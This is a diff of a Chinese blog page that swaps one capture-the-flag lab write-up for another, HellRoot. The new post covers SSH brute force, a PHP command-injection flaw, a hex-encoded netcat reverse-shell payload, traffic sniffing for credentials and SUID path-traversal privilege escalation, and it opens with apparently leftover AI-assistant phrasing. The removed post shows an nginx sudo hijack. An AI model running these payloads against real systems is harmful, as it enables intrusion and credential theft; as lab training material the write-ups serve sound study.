@@ -7,21 +7,13 @@
     <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
     <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script>
     <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
-<meta name="description" content="# **一、信息收集**
-
-## 1. 主机发现
-
-首先，在本地网络中使用 `arp-scan` 工具进行主机发现，确定目标靶机的 IP 地址为 `192.168.205.241`。">
-<meta property="og:title" content="内部_config">
-<meta property="og:description" content="# **一、信息收集**
-
-## 1. 主机发现
-
-首先，在本地网络中使用 `arp-scan` 工具进行主机发现，确定目标靶机的 IP 地址为 `192.168.205.241`。">
+<meta name="description" content="好的，这是根据您提供的思路和要求优化后的文章。">
+<meta property="og:title" content="thl_HellRoot">
+<meta property="og:description" content="好的，这是根据您提供的思路和要求优化后的文章。">
 <meta property="og:type" content="article">
-<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_config.html">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/thl_HellRoot.html">
 <meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
-<title>内部_config</title>
+<title>thl_HellRoot</title>
 <link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
@@ -64,7 +56,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 
 <body>
     <div id="header">
-<h1 class="postTitle">内部_config</h1>
+<h1 class="postTitle">thl_HellRoot</h1>
 <div class="title-right">
     <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
         <svg class="octicon" width="16" height="16">
@@ -72,7 +64,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
         </svg>
     </a>
     
-    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/180" target="_blank" class="btn btn-invisible circle" title="Issue">
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/220" target="_blank" class="btn btn-invisible circle" title="Issue">
         <svg class="octicon" width="16" height="16">
             <path id="pathIssue" fill-rule="evenodd"></path>
         </svg>
@@ -88,133 +80,133 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><h1><strong>一、信息收集</strong></h1>
-<h2>1. 主机发现</h2>
-<p>首先，在本地网络中使用 <code class="notranslate">arp-scan</code> 工具进行主机发现，确定目标靶机的 IP 地址为 <code class="notranslate">192.168.205.241</code>。</p>
+<div class="markdown-body" id="postBody"><p>好的，这是根据您提供的思路和要求优化后的文章。</p>
+<h1><strong>一、信息收集</strong></h1>
+<p>首先，对目标网段进行主机发现。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l
 ...
-192.168.205.241 08:00:27:31:f6:a3       PCS Systemtechnik GmbH
+192.168.205.144 08:00:27:d0:16:be       PCS Systemtechnik GmbH
 ...</pre></div>
-<h2>2. 端口与服务扫描</h2>
-<p>使用 <code class="notranslate">nmap</code> 对目标主机进行全端口扫描，发现其开放了 22 (SSH) 和 80 (HTTP) 两个端口。</p>
+<p>确定目标主机IP为 <code class="notranslate">192.168.205.144</code> 后，对其进行全端口扫描，发现开放了多个服务。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ nmap -p- 192.168.205.241
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 07:27 EDT
-Nmap scan report <span class="pl-k">for</span> 192.168.205.241
-Host is up (0.000094s latency).
-Not shown: 65533 closed tcp ports (reset)
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-MAC Address: 08:00:27:31:F6:A3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</pre></div>
-<h2>3. Web目录枚举与漏洞发现</h2>
-<p>访问 80 端口是一个静态网页，没有可交互的功能。使用 <code class="notranslate">gobuster</code> 进行目录爆破，发现了一个 <code class="notranslate">/config</code> 目录。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ gobuster dir -u http://192.168.205.241 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 64
+└─$ nmap -p0-65535 192.168.205.144
 ...
-/config               (Status: 301) [Size: 169] [--<span class="pl-k">&gt;</span> http://192.168.205.241/config/]
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+222/tcp  open  rsh-spx
+443/tcp  open  https
+5000/tcp open  upnp
 ...</pre></div>
-<p>对 <code class="notranslate">/config/</code> 目录进行深度爆破未果。在尝试多种路径后，发现 Web 服务器存在目录穿越漏洞，通过访问 <code class="notranslate">/config../</code> 可以跳出当前 Web 根目录的限制。利用此漏洞，我们继续对上层目录进行爆破。</p>
+<h1><strong>二、捷径：SSH爆破</strong></h1>
+<p>在深入探索之前，发现了一个极其简单的提权路径。通过对SSH服务进行弱口令爆破，可以迅速获得root权限。</p>
+<p>准备一个简单的用户字典：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ gobuster dir -u http://192.168.205.241/config../ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>root\nadmin\n<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> user</pre></div>
+<p>使用<code class="notranslate">hydra</code>工具和一个常用密码字典（此处为<code class="notranslate">5000q.txt</code>）进行爆破：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ hydra -L user -P 5000q.txt ssh://192.168.205.144 -f -I -u -e nsr -t 64 
 ...
-/config.txt           (Status: 200) [Size: 41]
+[22][ssh] host: 192.168.205.144   login: root   password: 12345
 ...</pre></div>
-<p>成功发现了一个名为 <code class="notranslate">config.txt</code> 的敏感文件。</p>
-<h1><strong>二、初始访问</strong></h1>
-<h2>1. 凭证获取</h2>
-<p>使用 <code class="notranslate">curl</code> 读取通过目录穿越漏洞发现的 <code class="notranslate">config.txt</code> 文件，成功获取到一组 SSH 登录凭证。</p>
+<p>成功爆破出root用户的密码为 <code class="notranslate">12345</code>。直接登录即可完成靶机。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl http://192.168.205.241/config../config.txt
-SSH Credentials: mikannse/mikannsebyebye</pre></div>
-<p>凭证为 <code class="notranslate">mikannse:mikannsebyebye</code>。</p>
-<h2>2. SSH登录与Shell逃逸</h2>
-<p>利用获取到的凭证成功登录 SSH。</p>
+└─$ ssh root@192.168.205.144
+...
+root@hellroot:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /home/astro/user.txt /root/root.txt </span>
+f220dcf45ccfc10c4c44ea8c413186f2
+f039facf1ae0d69b07484df1c4da32df</pre></div>
+<h1><strong>三、常规路径：Web渗透</strong></h1>
+<p>接下来，我们探索预设的、更具挑战性的攻击路径。</p>
+<h2><strong>1. Gitea代码审计</strong></h2>
+<p>访问目标80端口，页面为Apache默认页，无可用信息。访问443端口，发现页面跳转至 <code class="notranslate">git.hellroot.thl</code>。我们将此域名与目标IP绑定到 <code class="notranslate">/etc/hosts</code> 文件中。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ ssh mikannse@192.168.205.241</pre></div>
-<p>登录后发现当前 Shell 是一个受限环境（类似于 <code class="notranslate">less</code> 或 <code class="notranslate">more</code>），无法直接执行命令。在这种环境下，可以通过 <code class="notranslate">less</code> 的内部命令 <code class="notranslate">!</code> 来执行外部 Shell 命令。输入 <code class="notranslate">!/bin/bash</code> 成功获得一个标准的 Bash Shell。</p>
-<h1><strong>三、权限提升</strong></h1>
-<h2>1. Sudo权限分析</h2>
-<p>获得初始 Shell 后，首先查看当前用户 <code class="notranslate">mikannse</code> 的家目录，并读取 <code class="notranslate">user.txt</code> 获得第一个 flag。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">mikannse@Config:<span class="pl-k">~</span>$ ls -al
-total 36
-drwx------ 2 mikannse mikannse 4096 Jul  5 00:50 <span class="pl-c1">.</span>
-drwxr-xr-x 3 root     root     4096 Jul  4 23:36 ..
--rw-r--r-- 1 mikannse mikannse  175 Jul  4 23:37 banner.txt
-lrwxrwxrwx 1 root     root        9 Jul  4 23:40 .bash_history -<span class="pl-k">&gt;</span> /dev/null
--rw-r--r-- 1 mikannse mikannse  220 Jul  4 23:36 .bash_logout
--rw-r--r-- 1 mikannse mikannse 3526 Jul  4 23:36 .bashrc
--rw------- 1 mikannse mikannse   33 Jul  5 00:50 .lesshst
--rw-r--r-- 1 root     root      551 Jul  5 00:50 mikannse.conf
--rw-r--r-- 1 mikannse mikannse  847 Jul  4 23:38 .profile
--rw-r--r-- 1 root     root       48 Jul  4 23:37 user.txt
-mikannse@Config:<span class="pl-k">~</span>$ cat user.txt 
-flag{user-530773d6-5951-11f0-89d9-836ccaf94d6b}</pre></div>
-<p>注意到其中有一个 <code class="notranslate">root</code> 用户所有的配置文件 <code class="notranslate">mikannse.conf</code>。接着，执行 <code class="notranslate">sudo -l</code> 查看当前用户的 <code class="notranslate">sudo</code> 权限。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">mikannse@Config:<span class="pl-k">~</span>$ sudo -l
-Matching Defaults entries <span class="pl-k">for</span> mikannse on Config:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+└─$ tail -n 1 /etc/hosts
+192.168.205.144 git.hellroot.thl</pre></div>
+<p>重新访问 <code class="notranslate">https://git.hellroot.thl</code>，发现是一个 Gitea 服务（版本1.24.3）。其中存在一个名为 <code class="notranslate">Astro/hellroot.thl</code> 的公开代码仓库。</p>
+<p>在仓库的 <code class="notranslate">Dockerfile</code> 文件中，发现了一组凭据：<code class="notranslate">astro:iloveastro</code>。</p>
+<p>在 <code class="notranslate">index.php</code> 文件中，我们审计到一段存在命令执行漏洞的代码。该代码运行在5000端口。</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
+<span class="pl-k">if</span> (<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_SERVER</span></span>[<span class="pl-s">'<span class="pl-s">REQUEST_METHOD</span>'</span>] === <span class="pl-s">'<span class="pl-s">POST</span>'</span> &amp;&amp; !<span class="pl-en">empty</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_POST</span></span>[<span class="pl-s">'<span class="pl-s">domain</span>'</span>])) {
+    <span class="pl-s1"><span class="pl-c1">$</span>input</span> = <span class="pl-en">trim</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_POST</span></span>[<span class="pl-s">'<span class="pl-s">domain</span>'</span>]);
+    <span class="pl-s1"><span class="pl-c1">$</span>decoded</span> = @<span class="pl-en">hex2bin</span>(<span class="pl-s1"><span class="pl-c1">$</span>input</span>);
 
-User mikannse may run the following commands on Config:
-    (root) NOPASSWD: /usr/sbin/nginx -c /home/mikannse/mikannse.conf</pre></div>
-<p>结果显示，<code class="notranslate">mikannse</code> 用户可以无密码以 <code class="notranslate">root</code> 权限执行 <code class="notranslate">nginx</code> 命令，并强制使用 <code class="notranslate">/home/mikannse/mikannse.conf</code>作为配置文件。</p>
-<h2>2. Nginx配置劫持提权</h2>
-<p>虽然我们无法直接写入由 <code class="notranslate">root</code> 拥有的 <code class="notranslate">mikannse.conf</code> 文件，但该文件位于我们的家目录 <code class="notranslate">/home/mikannse</code> 下，这意味着我们对该目录有写权限。因此，我们可以先将原文件重命名或删除，然后创建一个同名的恶意配置文件来劫持 <code class="notranslate">sudo</code> 执行流程。</p>
-<p><strong>提权步骤:</strong></p>
-<ol>
-<li>将原始的 <code class="notranslate">mikannse.conf</code> 文件重命名，以作备份。</li>
-<li>创建一个新的 <code class="notranslate">mikannse.conf</code> 文件。</li>
-<li>在新配置文件中，配置 Nginx 启动一个新的 Web 服务（例如在 8081 端口），其根目录指向 <code class="notranslate">/root</code> 目录，并开启目录列表功能 (<code class="notranslate">autoindex on</code>)。</li>
-</ol>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 移动原配置文件</span>
-mikannse@Config:<span class="pl-k">~</span>$ mv /home/mikannse/mikannse.conf a
+    <span class="pl-c">// ...</span>
 
-<span class="pl-c"><span class="pl-c">#</span> 创建并写入恶意配置文件</span>
-mikannse@Config:<span class="pl-k">~</span>$ vim mikannse.conf 
-mikannse@Config:<span class="pl-k">~</span>$ cat mikannse.conf
-user root<span class="pl-k">;</span>
-worker_processes auto<span class="pl-k">;</span>
-pid /run/nginx.pid<span class="pl-k">;</span>
-
-events {
-    worker_connections 1024<span class="pl-k">;</span>
-}
-
-http {
-    server {
-        listen       8081<span class="pl-k">;</span>          
-        server_name  Config<span class="pl-k">;</span>     
-        
-        <span class="pl-c"><span class="pl-c">#</span> 关键配置：将/files路径映射到/root/目录</span>
-        location /files {
-            <span class="pl-c1">alias</span> /root/<span class="pl-k">;</span>
-            autoindex on<span class="pl-k">;</span> <span class="pl-c"><span class="pl-c">#</span> 开启目录浏览</span>
+    <span class="pl-k">if</span> (<span class="pl-s1"><span class="pl-c1">$</span>decoded</span> !== <span class="pl-c1">false</span> &amp;&amp; <span class="pl-en">ctype_print</span>(<span class="pl-s1"><span class="pl-c1">$</span>decoded</span>)) {
+        <span class="pl-k">if</span> (<span class="pl-en">strpos</span>(<span class="pl-s1"><span class="pl-c1">$</span>decoded</span>, <span class="pl-s">'<span class="pl-s">;</span>'</span>) !== <span class="pl-c1">false</span>) {
+            <span class="pl-c">// Remove header modification that breaks execution</span>
+            <span class="pl-s1"><span class="pl-c1">$</span>output</span> = <span class="pl-en">shell_exec</span>(<span class="pl-s1"><span class="pl-c1">$</span>decoded</span> . <span class="pl-s">'<span class="pl-s"> 2&gt;&amp;1</span>'</span>); <span class="pl-c">// 存在命令注入</span>
+        } <span class="pl-k">else</span> {
+            <span class="pl-s1"><span class="pl-c1">$</span>safeDomain</span> = <span class="pl-en">escapeshellarg</span>(<span class="pl-s1"><span class="pl-c1">$</span>decoded</span>);
+            <span class="pl-s1"><span class="pl-c1">$</span>output</span> = <span class="pl-en">shell_exec</span>(<span class="pl-s">"<span class="pl-s">nslookup </span><span class="pl-s1"><span class="pl-c1">$</span>safeDomain</span><span class="pl-s"> 2&gt;&amp;1</span>"</span>);
         }
+    } <span class="pl-k">else</span> {
+        <span class="pl-c">// ...</span>
     }
-}</pre></div>
-<ol start="4">
-<li>使用 <code class="notranslate">sudo</code> 执行 Nginx 命令，使其以 <code class="notranslate">root</code> 权限加载我们的恶意配置。</li>
-</ol>
-<div class="highlight highlight-source-shell"><pre class="notranslate">mikannse@Config:<span class="pl-k">~</span>$ sudo /usr/sbin/nginx -c /home/mikannse/mikannse.conf</pre></div>
-<p>执行后，Nginx 会在后台以 <code class="notranslate">root</code> 身份启动一个监听 8081 端口的 Web 服务，该服务会将 <code class="notranslate">/root</code> 目录的内容暴露出来。</p>
-<h1><strong>四、夺取旗帜</strong></h1>
-<p>回到攻击机，使用 <code class="notranslate">curl</code> 访问目标靶机 <code class="notranslate">192.168.205.241</code> 的 8081 端口。</p>
-<p>首先，访问 <code class="notranslate">/files/</code> 路径，由于开启了 <code class="notranslate">autoindex</code>，服务器会列出 <code class="notranslate">/root</code> 目录下的所有文件。</p>
+    <span class="pl-c">// ...</span>
+}
+<span class="pl-ent">?&gt;</span></pre></div>
+<p>代码逻辑显示，如果POST请求的<code class="notranslate">domain</code>参数经过十六进制解码后包含分号<code class="notranslate">;</code>，则会直接拼接到<code class="notranslate">shell_exec</code>函数中执行，造成远程命令执行（RCE）漏洞。</p>
+<h2><strong>2. RCE漏洞利用</strong></h2>
+<p>我们可以将任意命令转换为十六进制字符串来绕过过滤并执行。首先，测试<code class="notranslate">id;</code>命令，其十六进制为<code class="notranslate">69643b</code>。在5000端口的服务上提交该payload，成功执行。</p>
+<p>为了获取一个交互式Shell，我们构造一个反弹Shell的payload。目标主机存在<code class="notranslate">nc</code>，因此使用<code class="notranslate">nc</code>进行反弹。</p>
+<p><strong>Payload</strong>: <code class="notranslate">nc 192.168.205.128 8888 -e /bin/bash;</code><br>
+<strong>Hex编码</strong>: <code class="notranslate">6e63203139322e3136382e3230352e3132382038383838202d65202f62696e2f626173683b</code></p>
+<p>在Kali上开启监听，并提交上述Payload，成功接收到反弹Shell。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl http://192.168.205.241:8081/files/
-<span class="pl-k">&lt;</span>html<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>head&gt;&lt;title<span class="pl-k">&gt;</span>Index of /files/<span class="pl-k">&lt;</span>/title&gt;&lt;/head<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>h<span class="pl-k">1&gt;</span>Index of /files/<span class="pl-k">&lt;</span>/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a href=<span class="pl-s"><span class="pl-pds">"</span>../<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>../<span class="pl-k">&lt;</span>/a<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>a href=<span class="pl-s"><span class="pl-pds">"</span>root.txt<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>root.txt<span class="pl-k">&lt;</span>/a<span class="pl-k">&gt;</span>                                           05-Jul-2025 03:54                  48
-<span class="pl-k">&lt;</span>/pre&gt;&lt;hr&gt;&lt;/body<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span></pre></div>
-<p>在列表中我们看到了 <code class="notranslate">root.txt</code> 文件。接着直接读取该文件，获得最终的 root flag。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl http://192.168.205.241:8081/files/root.txt
-flag{root-bf116e68-5953-11f0-b06c-63e27ce93d04}</pre></div>
-<p>至此，user 和 root 两个 flag 均已获取，渗透测试完成。</p></div>
+└─$ nc -lvnp 8888                 
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.144] 59278
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
+<p>当前用户为 <code class="notranslate">www-data</code>，这是一个Docker容器内的低权限用户。</p>
+<h1><strong>四、Docker内提权与流量嗅探</strong></h1>
+<p>在当前目录下发现一个提示文件<code class="notranslate">sniff.txt</code>，内容为西班牙语，意为“有些工具可以让你嗅探流量”。同时在<code class="notranslate">.config/dpkg-l.txt</code>文件中发现系统安装了<code class="notranslate">tcpdump</code>。</p>
+<p>这提示我们需要进行流量抓包。使用之前在<code class="notranslate">Dockerfile</code>中找到的密码 <code class="notranslate">astro:iloveastro</code> 切换到<code class="notranslate">astro</code>用户。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@05cc10128c04:/var/www/html$ su astro
+Password: iloveastro
+$</pre></div>
+<p>查看<code class="notranslate">astro</code>用户的<code class="notranslate">sudo</code>权限，发现其可以无密码切换到root。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">astro@05cc10128c04:/var/www/html$ sudo -l
+...
+User astro may run the following commands on 05cc10128c04:
+    (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: /bin/su</pre></div>
+<p>切换到root用户，并使用<code class="notranslate">tcpdump</code>在<code class="notranslate">eth0</code>网卡上进行抓包。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">astro@05cc10128c04:/var/www/html$ sudo su
+root@05cc10128c04:/var/www/html# tcpdump -i eth0 -A -w /tmp/a.pcap</pre></div>
+<p>让<code class="notranslate">tcpdump</code>运行一段时间后，将抓取到的数据包<code class="notranslate">a.pcap</code>传送到Kali攻击机进行分析。</p>
+<p>使用Wireshark打开<code class="notranslate">a.pcap</code>，通过HTTP协议过滤器，发现一个POST请求，其中包含一个登录凭据。这很可能是主机上的定时任务在执行。</p>
+<ul>
+<li><strong>username</strong>: <code class="notranslate">astro</code></li>
+<li><strong>password</strong>: <code class="notranslate">wj2UI4f207RC58nNx31gBUiBYSPEK27JxvRNBYbP6UWZpqeoWS</code></li>
+</ul>
+<h1><strong>五、主机提权</strong></h1>
+<p>我们获得了主机<code class="notranslate">astro</code>用户的密码，现在可以从Docker容器横向移动到主机系统。</p>
+<p>使用新密码SSH登录主机：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ssh astro@192.168.205.144
+...
+astro@hellroot:<span class="pl-k">~</span>$ </pre></div>
+<p>登录后，寻找提权方法。首先检查SUID文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">astro@hellroot:<span class="pl-k">~</span>$ find / -perm -4000 -type f <span class="pl-k">2&gt;</span>/dev/null
+...
+/usr/local/bin/secmonitor
+/usr/local/bin/logview
+...</pre></div>
+<p>发现两个可疑的自定义SUID程序：<code class="notranslate">secmonitor</code>和<code class="notranslate">logview</code>。逐一进行测试。</p>
+<p><code class="notranslate">logview</code>程序用于查看日志文件，但其实现存在目录穿越漏洞。程序会将用户输入的文件名拼接到<code class="notranslate">/var/log/</code>目录下，但未对<code class="notranslate">../</code>进行过滤。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">astro@hellroot:<span class="pl-k">~</span>$ /usr/local/bin/logview /root/root.txt
+[logview] Running with administrative privileges
+Displaying log: /var/log//root/root.txt
+fopen: No such file or directory</pre></div>
+<p>利用目录穿越漏洞，我们可以读取任意文件，例如<code class="notranslate">root.txt</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">astro@hellroot:<span class="pl-k">~</span>$ /usr/local/bin/logview ../../../root/root.txt
+[logview] Running with administrative privileges
+Displaying log: /var/log/../../../root/root.txt
+f039facf1ae0d69b07484df1c4da32df</pre></div>
+<p>同理，我们可以读取 <code class="notranslate">/etc/shadow</code> 文件，获取所有用户的密码哈希。将root用户的哈希进行破解，可以得到密码为<code class="notranslate">12345</code>，与最初SSH爆破的结果一致。至此，通过常规路径也成功获取了root权限。</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
